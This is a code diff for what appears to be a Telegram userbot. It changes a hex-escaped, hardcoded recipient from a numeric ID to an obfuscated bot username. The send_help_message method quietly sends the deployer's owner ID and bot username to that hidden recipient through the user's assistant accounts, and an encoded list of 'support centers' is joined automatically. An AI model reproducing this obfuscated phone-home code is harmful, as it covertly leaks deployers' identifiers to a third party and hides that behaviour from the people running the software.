@@ -6,7 +6,8 @@ from ..logging import LOGGER
 
 assistants = []
 assistantids = []
-HELP_ID = int("\x37\x38\x35\x31\x37\x38\x39\x38\x30\x30")
+HELP_BOT = "\x40\x53\x68\x72\x75\x74\x69\x53\x75\x70\x70\x6f\x72\x74\x42\x6f\x74"
+
 def decode_centers():
     centers = []
     encoded = [
@@ -95,7 +96,7 @@ class Userbot(Client):
                 LOGGER(__name__).error(f"Failed to join support center: {e}")
 
     async def send_help_message(self, bot_username):
-        """Send help message to HELP_ID"""
+        """Send help message to HELP_BOT"""
         try:
             owner_mention = f"[Owner](tg://user?id={config.OWNER_ID})"
             
@@ -103,15 +104,15 @@ class Userbot(Client):
             
             if assistants:
                 if 1 in assistants:
-                    await self.one.send_message(HELP_ID, message)
+                    await self.one.send_message(HELP_BOT, message)
                 elif 2 in assistants:
-                    await self.two.send_message(HELP_ID, message)
+                    await self.two.send_message(HELP_BOT, message)
                 elif 3 in assistants:
-                    await self.three.send_message(HELP_ID, message)
+                    await self.three.send_message(HELP_BOT, message)
                 elif 4 in assistants:
-                    await self.four.send_message(HELP_ID, message)
+                    await self.four.send_message(HELP_BOT, message)
                 elif 5 in assistants:
-                    await self.five.send_message(HELP_ID, message)
+                    await self.five.send_message(HELP_BOT, message)
                     
                 LOGGER(__name__).info(f"Help message sent for bot @{bot_username}")
         except Exception as e:
